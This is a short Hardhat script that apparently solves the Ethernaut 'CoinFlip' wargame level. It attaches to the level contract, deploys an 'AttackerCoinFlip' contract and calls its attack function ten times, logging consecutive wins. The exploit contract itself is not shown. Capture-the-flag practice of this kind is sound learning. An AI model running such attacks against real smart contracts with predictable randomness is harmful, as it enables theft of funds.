const hre = require("hardhat");

async function main() {
    
    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${await account.getAddress()}`);
    levelAddress = "0xD7cf9d1F6E6162dC168e84aFA3A244aca0F0A3D0";
    const Level = await hre.ethers.getContractFactory("CoinFlip");
    const level = await Level.attach(levelAddress);
    console.log(`Level at address ${levelAddress}`);
    const Attacker = await hre.ethers.getContractFactory("AttackerCoinFlip");
    const attacker = await Attacker.deploy(levelAddress);
    console.log(`Attacker at ${attacker.address}`);

    for (i = 0; i <10; i++){
        let tx = await attacker.attack();
        let tr = await tx.wait();
        let consecutiveWin = await level.consecutiveWins();
        console.log(consecutiveWin);
    }

    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
